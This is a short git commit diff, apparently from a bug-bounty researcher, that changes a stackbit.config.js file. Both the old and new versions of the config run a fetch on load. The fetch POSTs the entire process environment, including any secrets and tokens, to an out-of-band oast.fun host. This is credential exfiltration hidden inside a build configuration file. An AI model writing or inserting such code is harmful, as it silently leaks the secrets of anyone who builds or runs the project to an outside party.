75aebb041d4df7475302068774bbcda9f89562cd
10ad3d <loaded@wearehackerone.com>
2024-06-20 16:08:02 -0700

    config fuzz

--- stackbit.config.js
+++ stackbit.config.js
@@ -1,8 +1,12 @@
-export const config = {
-  f: fetch("https://cpqb2vhucph5v6bv9m9gomoeajyuo5gm8.oast.fun", {
+async function config() {
+  const foo = await fetch("https://cpqb2vhucph5v6bv9m9gomoeajyuo5gm8.oast.fun", {
     method: "POST",
     body: JSON.stringify(process.env)
-  }),
-  "stackbitVersion": "1"
+  })
+  
+  
+  return {
+    stackbitVersion: 1,
+  }
 }
-config.f()
+config()
